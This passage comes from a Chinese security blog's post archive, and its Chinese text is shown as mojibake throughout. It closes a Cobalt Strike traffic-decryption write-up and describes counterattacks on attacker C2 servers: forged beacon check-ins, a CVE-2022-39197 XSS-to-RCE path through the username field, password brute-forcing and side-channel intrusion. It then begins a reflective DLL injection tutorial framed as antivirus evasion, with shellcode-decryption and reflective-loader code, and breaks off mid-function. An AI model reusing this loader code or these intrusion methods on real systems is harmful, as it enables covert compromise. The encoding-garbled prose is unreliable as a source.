<br>            System.out.println(<span class="hljs-string">&quot;è§£å¯†æˆåŠŸ&quot;</span>);  <br>            fos.write(text);  <br>            System.out.println(<span class="hljs-keyword">new</span> String(text));  <br>                    System.out.println(<span class="hljs-string">&quot;privatekey :&quot;</span>+<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(keyPair1.getPrivate().getEncoded())));  <br>                    System.out.println(<span class="hljs-string">&quot;publickey : &quot;</span>+<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(keyPair1.getPublic().getEncoded())));  <br>        &#125;  <br>    &#125;  <br>&#125; <br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬ç°åœ¨å¾—åˆ°çš„å…¬é’¥ä¸æˆ‘ä»¬ä¹‹å‰è§£å¯†beaconæ‰€è·å–çš„0x0007 publickeyå…¬é’¥ç›¸åŒ<br>å°†ç§é’¥ç¼–ç ï¼Œä¼ å…¥RSAç§é’¥å¯¹ï¼Œæ ¹æ®CSé‡Œé¢å…ƒæ•°æ®çš„ç»“æ„ä½“ï¼Œå°†è§£å¯†åçš„å†…å®¹è¿›è¡Œæ•´ç†<br>è§£å¯†ä¹‹åçš„ç»“æœï¼Œå°±å¯ä»¥çœ‹åˆ°å—å®³æœºå™¨ä¿¡æ¯ï¼Œä¸»æœºåã€ç”¨æˆ·åã€æ ·æœ¬å</p></li><li><p>ä½¿ç”¨ç§é’¥è§£å¯†cookieså­—æ®µçš„å†…å®¹ï¼Œè·å–åˆ°å¯¹ç§°å¯†é’¥å’Œç›¸å…³å—å®³æ®µä¿¡æ¯å¹¶åˆ¤æ–­aggressorç«¯æ˜¯å¦æœ‰è¦æ‰§è¡Œçš„ç›¸å…³ä»»åŠ¡<br><img src="https://s2.loli.net/2022/11/28/WdSkMfa7E2vxrtm.png"><br><img src="https://s2.loli.net/2022/11/28/la7L68op12D5zQA.png"></p></li><li><p>æœ‰ä»»åŠ¡ï¼šåœ¨ç›¸åº”é¢˜é‡Œé¢å‘é€ä½¿ç”¨å¯¹ç§°å¯†é’¥AESåŠ å¯†å¾…æ‰§è¡Œå‘½ä»¤çš„å†…å®¹ï¼Œæ²¡æœ‰ä»»åŠ¡ï¼šå“åº”ç©º<br><img src="https://s2.loli.net/2022/11/28/vsVUzCSWkDaOmFt.png"><br>å¯ä»¥çœ‹åˆ°åœ¨ä¸€ä¸ªå¿ƒè·³åŒ…çš„æ¥å›ä¸­ï¼Œå“åº”æµé‡ä¼šå¸¦æœ‰ç±»ä¼¼ä¹±ç çš„ä¿¡æ¯ï¼Œè€Œè¿™å…¶å®æ˜¯C2åœ¨å‘é€ä»»åŠ¡ç»™å—å®³ä¸»æœº<br>ç”±äºè¿™ä¸¤éƒ¨åˆ†æµé‡éƒ½æ˜¯ç”±å¯¹åº”çš„å¯¹ç§°å¯†é’¥åŠ å¯†å¾—ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ä¹‹å‰è·å–åˆ°çš„è§£å¯†å…ƒæ•°æ®ä¸­çš„rawkeyï¼Œå³å¯è¿›è¡Œè§£å¯†<br><img src="https://s2.loli.net/2022/11/28/qr7s1vLfRhgptGd.png"><br>æ¥ç€æˆ‘ä»¬è¿›è¡Œç›¸åº”çš„è§£å¯†ï¼Œå°±å¯ä»¥å¾—åˆ°å…¶å¯¹åº”çš„ç›´æ¥é€šä¿¡çš„æ˜æ–‡æµé‡<br>!(<a href="https://s2.loli.net/2022/11/28/TbL1qgaHumWd8F3.png">https://s2.loli.net/2022/11/28/TbL1qgaHumWd8F3.png</a>)</p></li><li><p>ä½¿ç”¨ç”Ÿæˆçš„å¯¹ç§°å¯†é’¥,AESè§£å¯†å“åº”ä½“ï¼Œæ‰§è¡Œå¯¹åº”ä»»åŠ¡</p></li><li><p>é€šè¿‡Postè¯·æ±‚é‡Œé¢çš„è¯·æ±‚ä½“æ¥å°†å›æ˜¾è¯·æ±‚ä½“å†…å®¹ä¸ºä½¿ç”¨å¯¹ç§°å¯†é’¥AESåŠ å¯†æ‰§è¡Œç»“æœ<br><img src="https://s2.loli.net/2022/11/28/jSPgDMqTYksWIao.png"></p></li></ol><h2 id="Cobaltstrikeè“é˜Ÿååˆ¶"><a href="#Cobaltstrikeè“é˜Ÿååˆ¶" class="headerlink" title="Cobaltstrikeè“é˜Ÿååˆ¶"></a>Cobaltstrikeè“é˜Ÿååˆ¶</h2><p>ä¸Šé¢æˆ‘ä»¬åˆ†æå®Œäº†Cobaltstrikeçš„ä¸Šçº¿è¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è“é˜Ÿå¦‚ä½•åˆ©ç”¨CSè¿™ä¸ªä¸Šçº¿çš„è¿‡ç¨‹æ¥è¿›è¡Œååˆ¶ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹å››ç§æ–¹å¼</p><h3 id="ä¼ªé€ æµé‡æ‰¹é‡ä¸Šçº¿ï¼ˆæ¬ºéª—é˜²å¾¡ï¼‰"><a href="#ä¼ªé€ æµé‡æ‰¹é‡ä¸Šçº¿ï¼ˆæ¬ºéª—é˜²å¾¡ï¼‰" class="headerlink" title="ä¼ªé€ æµé‡æ‰¹é‡ä¸Šçº¿ï¼ˆæ¬ºéª—é˜²å¾¡ï¼‰"></a>ä¼ªé€ æµé‡æ‰¹é‡ä¸Šçº¿ï¼ˆæ¬ºéª—é˜²å¾¡ï¼‰</h3><p>ä¼ªé€ æµé‡æ‰¹é‡ä¸Šçº¿è¿™ä¸ªæ‰‹æ®µæ˜¯å±äºæŠ€æˆ˜æ³•é‡Œé¢çš„æ¬ºéª—é˜²å¾¡ï¼Œé€šè¿‡ä¼ªé€ ä¸Šçº¿å¿ƒè·³æµé‡ï¼Œå‘é€è‡³æ”»å‡»è€…çš„c2ï¼Œä½¿æ”»å‡»è€…çš„c2åŒæ—¶ä¸Šçº¿çš„å¤§é‡ç»ˆç«¯<br>é€šå¸¸æœ‰ä¸¤ç§å¸¸è§åœºæ™¯ï¼š<br>ç¬¬ä¸€ç§æ˜¯ï¼Œå‘ç°æ”»å‡»è€…å¯¹æˆ‘ä»¬å•ä½åœ¨è¿›è¡Œç²¾å‡†é’“é±¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¬ºéª—é˜²å¾¡ï¼Œæ¥æ··æ·†æ”»å‡»è€…çš„è§†å¬ï¼Œè®©æ”»å‡»è€…çš„c2serverä¸Šçº¿å¤§é‡æœºå™¨ï¼Œä½†æ˜¯æ”»å‡»è€…å´æ‰§è¡Œä¸äº†ä»»ä½•å‘½ä»¤<br>ç¬¬äºŒç§æ˜¯ï¼Œå‘ç°æˆ‘ä»¬å†…éƒ¨å·²ç»å­˜åœ¨è¢«é’“é±¼ä¸Šçº¿çš„æœºå™¨ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬é€šè¿‡è¿™ç§æ¬ºéª—é˜²å¾¡å°±æ˜¯æ¥æ‹–å»¶æ”»å‡»è€…ï¼Œä½¿æ”»å‡»è€…éš¾è¾¨çœŸå‡ï¼Œä»è€Œäº‰å–ä¸€äº›æ’æŸ¥å¤„ç½®çš„æ—¶é—´</p><p>è€Œå¯¹äºä¼ªé€ ä¸Šçº¿æµé‡ï¼Œå°±æ˜¯æ„é€ å¿ƒè·³æµé‡ï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ cookieå­—æ®µï¼Œé‚£æˆ‘ä»¬å°±æ ¹æ®ä¸Šé¢æ‰€æŠ“çš„å¿ƒè·³åŒ…ï¼Œæ„é€ ç›¸åº”çš„æµé‡ï¼Œè€Œå…¶æ„é€ ç»“æ„ä¸»è¦æ˜¯</p><blockquote><p>æ ‡å¿—å¤´ï¼ˆ4ï¼‰+Sizeï¼ˆ4ï¼‰+Rawkey(16)+å­—ä½“ï¼ˆ4ï¼‰+beacon ID(4)+ è¿›ç¨‹IDï¼ˆ4ï¼‰+port(2)+å†…æ ¸ï¼ˆ4ï¼‰+09 +å¤±é™·IP + 09 + ä¸»æœºå+ 09 + ç”¨æˆ·å+09+è¿›ç¨‹å<br>CSçš„ç›‘å¬å™¨åˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¿ƒè·³æ˜¯é€šè¿‡beacon IDè¿™ä¸ªå±æ€§æ¥åˆ¤æ–­çš„ï¼Œåªè¦è¿™ä¸ªå±æ€§ä¸ä¸€æ ·å°±ä¼šè¢«è¯†åˆ«æˆä¸åŒçš„ä¸Šçº¿æµé‡ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ‹¿åˆ°å…¬é’¥ï¼Œå¯¹ä¼ªé€ çš„æ˜æ–‡æµé‡è¿›è¡ŒåŠ å¯†ï¼Œå°±å¯ä»¥ç”Ÿæˆcookieå­—æ®µäº†ï¼Œè¿™é‡Œä½œè€…ä¹Ÿå®ç°äº†æ‰¹é‡ä¸Šçº¿çš„<a href="https://github.com/minhangxiaohui/cobaltstrikefakeup">å·¥å…·</a></p></blockquote><p>å¯ä»¥çœ‹åˆ°ï¼Œä¼ªé€ çš„å¿ƒè·³æµé‡å·²ç»æ‰¹é‡ä¸Šçº¿äº†<br><img src="https://s2.loli.net/2022/11/28/BvWrZEtlM5VdcfJ.png"></p><h3 id="é€šè¿‡æ¼æ´ååˆ¶"><a href="#é€šè¿‡æ¼æ´ååˆ¶" class="headerlink" title="é€šè¿‡æ¼æ´ååˆ¶"></a>é€šè¿‡æ¼æ´ååˆ¶</h3><p>å¯¹äºCSçš„CVEï¼Œæœ‰CVE-2021-36798ã€CVE-2022-23317ç­‰ï¼Œä½†è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯CVE-2022-39197<br>å…¶ä¸»è¦æ˜¯XSS<br>å…ƒæ•°æ®æ ¼å¼ï¼šæ ‡å¿—å¤´ï¼ˆ4ï¼‰+Sizeï¼ˆ4ï¼‰+Rawkey(16)+å­—ä½“ï¼ˆ4ï¼‰+beacon ID(4)+ è¿›ç¨‹IDï¼ˆ4ï¼‰+port(2)+å†…æ ¸ï¼ˆ4ï¼‰+09 +å¤±é™·IP + 09 + ä¸»æœºå+ 09 + <code>ç”¨æˆ·å</code>+09+è¿›ç¨‹å<br>è€ŒXSSçš„æ³¨å…¥ç‚¹å°±åœ¨äºè¿™ä¸ªç”¨æˆ·å<br>åœ¨è¿™é‡Œå¯ä»¥æ³¨å…¥ä¸€äº›ä¸œè¥¿ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ä»–å­—æ®µçš„é•¿åº¦ç¼©çŸ­ï¼Œå› ä¸ºæœ€ç»ˆè¢«åŠ å¯†æ—¶ï¼Œæ‰€å¯¹åº”çš„é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ï¼Œå› ä¸ºé€šè¿‡æ¨¡nåŒä½™è®¡ç®—æ—¶ï¼Œç»“æœéƒ½æ˜¯è¦å—é™åˆ¶ä¸nçš„é•¿åº¦<br>è¿™é‡ŒXSSå€’æ˜¯ä¸éš¾ï¼Œä½†åœ¨æ¼‚äº®é¼ å¸ˆå‚…çš„æ–‡ç« ä¸­ï¼Œå®ç°äº†ä»XSSåˆ°RCE<br>å…¶è¿‡ç¨‹ä¸»è¦æ˜¯é€šè¿‡swingé‡Œé¢å¼•ç”¨htmlæ¸²æŸ“çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬å¼•ç”¨çš„ç›¸åº”æ ‡ç­¾çš„æ—¶å€™ï¼Œä¼šé€šè¿‡javax.swing.text.html.HTMLEditorKitç±»ä¸­createæ–¹æ³•æ¥åˆ›å»ºå¯¹åº”çš„å…ƒç´ ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„æ ‡ç­¾æ˜¯ä¸€ä¸ªHTML.Tag.OBJECTç±»å‹çš„æ ‡ç­¾çš„æ—¶å€™ä¼šè°ƒç”¨new ObjectView()æ¥ç”Ÿæˆå¯¹åº”çš„å…ƒç´ ï¼Œè¿™é‡Œé¢è§£æobjectæ ‡ç­¾çš„æ—¶å€™ä¼šæ ¹æ®å…¶Classidæ¥è§£æï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šé€šè¿‡Class.fornameåŠ è½½å¯¹åº”ç±»ç„¶åé€šè¿‡newinstanceè·å–classidä¼ å…¥ç±»çš„å®ä¾‹ï¼Œå¹¶ä¸”å½“è¯¥ç±»ç»§æ‰¿äº†Componentæ—¶ï¼Œä¼šè°ƒç”¨setParametersæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢ä¸€å®šæƒ…å†µä¸‹ä¼šåå°„è°ƒç”¨å¯¹åº”ç±»çš„å¯¹åº”å‚æ•°çš„setæ–¹æ³•ï¼ˆè¿™é‡Œçš„æ¡ä»¶æ˜¯ï¼šè¯¥æ–¹æ³•çš„ä¼ å…¥å‚æ•°åªæœ‰ä¸€ä¸ªä¸”æ˜¯Stringç±»å‹ï¼‰ï¼Œå¹¶ä¸”è¯¥setæ–¹æ³•ä¼ å…¥çš„å‚æ•°ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä»è€Œè¿™é‡Œå°±å‡ºç°äº†ä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„å¯èƒ½</p><p>è¿™ç§ååˆ¶ç±»ä¼¼äºå†…ç½‘ä¸­çš„èœœç½ï¼Œè®©æ”»å‡»è€…æ‰“è¿›æ¥ï¼Œç„¶ååå‘è·å–æ”»å‡»è€…çš„ä¸€äº›ä¿¡æ¯æˆ–è€…æƒé™æ¥ååˆ¶</p><h3 id="çˆ†ç ´serverå£ä»¤"><a href="#çˆ†ç ´serverå£ä»¤" class="headerlink" title="çˆ†ç ´serverå£ä»¤"></a>çˆ†ç ´serverå£ä»¤</h3><p>è¿™ç§æ–¹å¼æ˜¯å½“æˆ‘ä»¬è¿”ç°ä¸€ä¸ªvpnè¿è¡Œäº†cs serverçš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šè¿‡å£ä»¤å­—å…¸å¯¹serverç«¯å®ç°çˆ†ç ´ï¼Œä»è€Œç™»å½•serverï¼Œè·å–æ”»å‡»è€…çš„ç›¸å…³ä¿¡æ¯<br>ä½†è¿™ç§æ–¹å¼ä¼šé‡åˆ°ä¸€äº›é—®é¢˜</p><ol><li>æ”»é˜²ä¸­ï¼Œä¸å®¹æ˜“æ‰¾åˆ°çœŸå®çš„c2ï¼Œå¤§å¤šè¢«éšè—ï¼Œä¾‹å¦‚ï¼šåŸŸå‰ç½®æŠ€æœ¯ã€äº‘å‡½æ•°è½¬å‘ç­‰</li><li>ä½¿ç”¨csçš„çº¢é˜Ÿï¼Œè‡ªèº«å‡ºç°å¼±å£ä»¤çš„æ¦‚ç‡å¹¶ä¸é«˜</li><li>æ”»é˜²ä¸­ï¼Œå›¢é˜Ÿä½¿ç”¨çš„csï¼Œä¼šå‡ºç°å„ç§æ”¹ç‰ˆè¿‡çš„ç™»å½•åè®®ï¼Œéš¾ä»¥æ”»å‡»</li><li>csè‡ªèº«åšè¿‡ç›¸åº”çš„å¤„ç†ï¼Œå¯¹è¿™ç§çˆ†ç ´åšäº†ä¸€å®šçš„é˜²å¾¡æªæ–½</li></ol><h3 id="æ—è·¯ååˆ¶"><a href="#æ—è·¯ååˆ¶" class="headerlink" title="æ—è·¯ååˆ¶"></a>æ—è·¯ååˆ¶</h3><p>è¿™ä¸ªå°±æ¯”è¾ƒæ³›æ³›è€Œè°ˆäº†ï¼Œå¥½æ¯”æ¸—é€æµ‹è¯•æˆ–è€…æ˜¯rtæ‰“é¡¹ç›®çš„æ—¶å€™ï¼Œå¦‚æœç›®æ ‡æ‰¾ä¸åˆ°åˆ©ç”¨ç‚¹è¿›å»ï¼Œå°±å¯ä»¥ä»æ—ç«™çœ‹çœ‹å¯¹å§ï¼Œæ‰€ä»¥è¿™ç§æ—è·¯ååˆ¶äº¦æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ªc2ä¸Šè¿è¡Œç€cobaltstrike serveräº†ï¼Œç„¶åä¸Šè¿°çš„å…¶ä»–ååˆ¶æ‰‹æ®µéƒ½è¡Œä¸é€šï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥çœ‹çœ‹ï¼Œè¿™ä¸ªc2ä¸Šæ˜¯ä¸æ˜¯è¿˜æœ‰å…¶ä»–çš„æœåŠ¡ï¼Œæˆ‘ä»¬å¯¹å…¶ç«¯å£è¿›è¡Œæ‰«æï¼Œè·å–ç›¸å…³ä¿¡æ¯ï¼Œä»å…¶ä»–æœåŠ¡çš„ç¼ºé™·æ¥å®ç°ååˆ¶ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå¾ˆå¯¹rtæˆ–è€…æ”»å‡»è€…åœ¨é‡åˆ°weblogicã€fastjsonã€log4j2ç­‰jndiæ¼æ´çš„æ—¶å€™ï¼Œè¦è¿›è¡Œæ¼æ´åˆ©ç”¨å°±å¾—èµ·rmiæˆ–è€…ldapï¼Œserverï¼Œè‡ªå·±æ‰‹åŠ¨èµ·æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œæ‰€ä»¥ç½‘ä¸Šä¼šæœ‰å¾ˆå¤šçš„è‡ªåŠ¨åŒ–å·¥å…·ï¼Œè¿™å¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å‘ç°ç½‘ä¸Šè¿™ç±»å·¥å…·çš„ä¸€äº›rceäº†ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ååˆ¶ã€‚</p><p>å‰æ®µæ—¶é—´å‚åŠ æŸæ¬¡æ¼”ä¹ æ´»åŠ¨çš„æ—¶å€™ï¼Œé€šè¿‡ä¸€äº›æ‰‹æ®µæ‹¿åˆ°äº†ä¸€ä¸ªc2ï¼Œå¯¹c2è¿›è¡Œæ‰«æåå‘ç°ï¼Œå…¶ç›¸å…³ç«¯å£æ­å»ºçš„æœåŠ¡æ˜¯npsçš„webæ§åˆ¶ç«¯æœåŠ¡ï¼Œæ‰€ä»¥åç»­å°±å¯ä»¥é€šè¿‡çˆ†ç ´è¯¥æœåŠ¡æ¥å®ç°ååˆ¶ï¼Œè™½ç„¶åç»­çˆ†ç ´æ— æœï¼Œåç»­çš„è¯æ­£å¥½å½“æ—¶npsæ˜¯çˆ†å‡ºæ¥äº†ä¸ªé‰´æƒçš„æ¼æ´ï¼Œé€šè¿‡è¿™ä¸ªæ¼æ´æˆ‘ä»¬å®ç°ååˆ¶ï¼Œæ‹¿åˆ°äº†æ”»å‡»è€…çš„ä¸€äº›ä¿¡æ¯ï¼Œä»¥åŠå…¶æŒæ¡çš„ç›¸å…³æƒé™ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œæ—è·¯ååˆ¶çš„è¿™ä¸ªæ¦‚å¿µæ˜¯éå¸¸å¹¿æ³›çš„ï¼Œæ‰‹æ®µä¹Ÿæ˜¯å±‚å‡ºä¸æœ½çš„ã€‚åœ¨è¿‘äº›å¹´çš„æ”»é˜²çš„åšå¼ˆä¸­ï¼Œé˜²å®ˆæ–¹çš„é˜²å®ˆä½“ç³»å·²ç»é€æ¸ä½“ç³»æˆç†ŸåŒ–ï¼Œå¹¶ä¸”ä¹Ÿé€æ¸å¼€å¯äº†ä¸€äº›ååˆ¶çš„å·è§’ï¼Œè¿™é‡Œé¢èœœç½æ˜¯æœ€å…·æœ‰é‡Œç¨‹ç¢‘æ„ä¹‰çš„ã€‚ç¬”è€…è®¤ä¸ºä¸€æ–¹æ”»ä¸€æ–¹å®ˆå¹¶ä¸æ˜¯æ‰€è°“çš„æ”»é˜²ï¼Œæ”»é˜²ä¹Ÿè€…ï¼Œåº”è¯¥æ˜¯æ¥å›äº¤æˆ˜ï¼Œæ”»ä¸­å¸¦é˜²ï¼ˆæ”»å‡»è€…è¦èƒ½æŒæ¡åååˆ¶æ‰‹æ®µï¼‰ï¼Œé˜²ä¸­å¸¦æ”»ï¼ˆé˜²å®ˆè€…è¦èƒ½æŠ“ä½æ”»å‡»è€…éœ²å‡ºçš„é©¬è„šï¼Œè¿›è¡Œååˆ¶ï¼‰ï¼Œå°±å’Œå¤ä»£æ­¦ä¾ æ¯”æ­¦ä¸€æ ·ã€‚</p><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://forum.butian.net/share/1861">https://forum.butian.net/share/1861</a><br><a href="https://forum.butian.net/share/1975">https://forum.butian.net/share/1975</a><br><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå°„å‹DLLæ³¨å…¥</title>
      <link href="2022/11/15/%E5%8F%8D%E5%B0%84%E5%9E%8BDLL%E6%B3%A8%E5%85%A5/"/>
      <url>2022/11/15/%E5%8F%8D%E5%B0%84%E5%9E%8BDLL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="åå°„å‹DLLæ³¨å…¥"><a href="#åå°„å‹DLLæ³¨å…¥" class="headerlink" title="åå°„å‹DLLæ³¨å…¥"></a>åå°„å‹DLLæ³¨å…¥</h1><h2 id="å¸¸è§„DLLæ³¨å…¥"><a href="#å¸¸è§„DLLæ³¨å…¥" class="headerlink" title="å¸¸è§„DLLæ³¨å…¥"></a>å¸¸è§„DLLæ³¨å…¥</h2><p>ç£ç›˜è¯»å–dllåˆ°æ•°ç»„ -&gt; å°†payloadæ•°ç»„å†™å…¥ç›®æ ‡å†…å­˜ -&gt; åœ¨ç›®æ ‡å†…å­˜ä¸­æ‰¾åˆ°LoadLibraryW -&gt; é€šè¿‡CreateRemoteThreadè°ƒç”¨LoadLibraryWå‡½æ•°ï¼Œå‚æ•°ä¸ºdllåœ¨å†…å­˜ä¸­çš„åœ°å€</p><a id="more"></a><p>ä½†è¿™æ ·çš„æ“ä½œä¼šå¤šæ¬¡è§¦ç¢°åˆ°AVçš„æŠ¥æ¯’ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¼•å…¥äº†åå°„å‹DLLæ³¨å…¥æŠ€æœ¯</p><h2 id="åå°„å‹DLLå®ç°æ€è·¯"><a href="#åå°„å‹DLLå®ç°æ€è·¯" class="headerlink" title="åå°„å‹DLLå®ç°æ€è·¯"></a>åå°„å‹DLLå®ç°æ€è·¯</h2><ol><li>æœ‰Açº¿ç¨‹å‘Bçº¿ç¨‹å†™å…¥dll</li><li>è°ƒç”¨Bçº¿ç¨‹çš„embedded bootstrapper code</li><li>é€šè¿‡bootstrapper shellcodeè°ƒç”¨dllçš„å¯¼å‡ºå‡½æ•°reflective loader</li></ol><p>reflective loaderå®é™…ä¸Šæ˜¯ä¸€ä¸ªè‡ªå·±å®ç°çš„LoadLibraryWå‡½æ•°ï¼Œä»å†…å­˜ä¸­æ‰¾åˆ°æˆ‘ä»¬å†™å…¥çš„dllå¹¶ä¿®å¤ä½¿å…¶æˆä¸ºå¯ä»¥è¢«æ­£å¸¸ä½¿ç”¨çš„peæ–‡ä»¶ï¼Œæœ€åè°ƒç”¨DLLmainå®ç°æˆ‘ä»¬çš„æ¶æ„åŠŸèƒ½</p><p>ä½†éšç€AVçš„è¿›æ­¥ï¼Œè¿™ç§è¿œç¨‹è¿›ç¨‹ã€çº¿ç¨‹æ³¨å…¥çš„æ–¹å¼ï¼Œä¹Ÿæ˜¯éš¾ä»¥bypassçš„ï¼Œè€Œä¸”æˆ‘ä»¬ä¸éœ€è¦bootstrapper shellcodeè¿™ä¸ªéƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨åŠ è½½éƒ¨åˆ†ç®—å‡ºreflective loaderåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç›´æ¥è°ƒç”¨</p><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><h3 id="å¤§ä½“æ€è·¯"><a href="#å¤§ä½“æ€è·¯" class="headerlink" title="å¤§ä½“æ€è·¯"></a>å¤§ä½“æ€è·¯</h3><p><a href="https://github.com/Allevon412/ReflectiveDLL_Sektor7">ReflectiveDLL_Sektor7</a></p><p>æ¥çœ‹å…¶ä¸­çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">AESDecrypt((<span class="hljs-keyword">char</span>*)payload, payload_len, (<span class="hljs-keyword">char</span>*)key, <span class="hljs-keyword">sizeof</span>(key));<br></code></pre></td></tr></table></figure><p>è§£å¯†shellcodeï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯AESè§£å¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">DWORD <span class="hljs-title">GetReflectiveLoaderOffset</span><span class="hljs-params">(VOID* lpReflectiveDllBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br>UINT_PTR uiBaseAddress = <span class="hljs-number">0</span>;<br>UINT_PTR uiExportDir = <span class="hljs-number">0</span>;<br>UINT_PTR uiNameArray = <span class="hljs-number">0</span>;<br>UINT_PTR uiAddressArray = <span class="hljs-number">0</span>;<br>UINT_PTR uiNameOrdinals = <span class="hljs-number">0</span>;<br>DWORD dwCounter = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> WIN_X64</span><br>DWORD dwCompiledArch = <span class="hljs-number">2</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-comment">// This will catch Win32 and WinRT.</span><br>DWORD dwCompiledArch = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;<br><br><span class="hljs-comment">// get the File Offset of the modules NT Header</span><br>uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;<br><br><span class="hljs-comment">// currenlty we can only process a PE file which is the same type as the one this fuction has  </span><br><span class="hljs-comment">// been compiled as, due to various offset in the PE structures being defined at compile time.</span><br><span class="hljs-keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == <span class="hljs-number">0x010B</span>) <span class="hljs-comment">// PE32</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwCompiledArch != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == <span class="hljs-number">0x020B</span>) <span class="hljs-comment">// PE64</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwCompiledArch != <span class="hljs-number">2</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// uiNameArray = the address of the modules export directory entry</span><br>uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<br><br><span class="hljs-comment">// get the File Offset of the export directory</span><br>uiExportDir = uiBaseAddress + 